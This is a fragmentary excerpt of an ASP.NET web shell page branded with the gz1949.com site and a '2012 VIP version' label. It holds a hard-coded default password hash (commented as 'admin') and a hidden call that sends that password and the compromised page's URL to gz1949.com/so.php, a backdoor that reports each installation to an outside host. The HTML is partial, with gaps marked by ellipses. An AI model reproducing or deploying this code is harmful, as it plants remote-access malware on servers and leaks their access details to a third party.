...
<script runat="server">
public string Password="21232f297a57a5a743894a0e4a801fc3";  //默认密码:admin
...
string s = "http://gz1949.com/so.php?user=" + Password + "&url=" +HttpContext.Current.Request.Url.ToString();
ss.DownloadData(s);
PBZw();
}
else
...
<tr class="head">
<td ><span style="float:right;"><a href="www.gz1949.com" target="_blank">更新时间2012年VIP版本</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
